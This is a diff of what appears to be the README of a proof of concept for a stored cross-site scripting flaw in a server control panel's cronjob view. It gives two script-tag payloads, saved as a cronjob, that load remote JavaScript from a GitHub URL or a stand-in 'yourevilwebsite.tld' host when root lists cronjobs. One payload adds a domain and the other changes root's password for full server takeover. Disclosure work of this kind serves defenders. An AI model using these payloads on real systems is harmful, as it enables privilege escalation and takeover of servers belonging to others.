@@ -27,13 +27,13 @@ I've created 2 examples on how you can escalate this attack to take control of t
 
 1. <b>PayloadAddDomain.js</b> : add this code as your cronjob, when the root user list the cronjobs, a new domain name will be added under the choosen user.
 ``` 
-<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadAddDomain.js"></script>
+<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadAddDomain.js"></script>
 ```
 
 
 2. <b>PayloadChangeRootPass.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to change to root's password and take control of the full server.
 ``` 
-<script type="text/javascript" src="https://raw.githubusercontent.com/TnExperts/cwppoc/main/PayloadChangeRootPass.js"></script>
+<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadChangeRootPass.js"></script>
 ```
 
 
